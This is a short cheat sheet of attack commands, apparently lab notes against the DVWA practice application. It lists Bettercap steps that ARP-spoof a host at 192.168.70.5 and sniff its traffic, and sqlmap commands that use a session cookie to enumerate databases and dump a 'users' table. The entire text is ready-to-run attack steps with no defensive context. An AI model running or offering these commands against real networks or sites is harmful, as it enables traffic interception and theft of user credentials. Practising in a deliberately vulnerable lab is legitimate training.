# Web & MITM Attacks

### 1. Bettercap (Sniffing)
bettercap -iface eth0
net.probe on
set arp.spoof.targets 192.168.70.5
arp.spoof on
net.sniff on

### 2. SQL Injection (SQLMap)
# Get DBs
sqlmap -u "URL_HERE" --cookie="COOKIE_HERE" --dbs
# Get Tables
sqlmap -u "URL_HERE" --cookie="COOKIE_HERE" -D "dvwa" --tables
# Dump Data
sqlmap -u "URL_HERE" --cookie="COOKIE_HERE" -D "dvwa" -T "users" --dump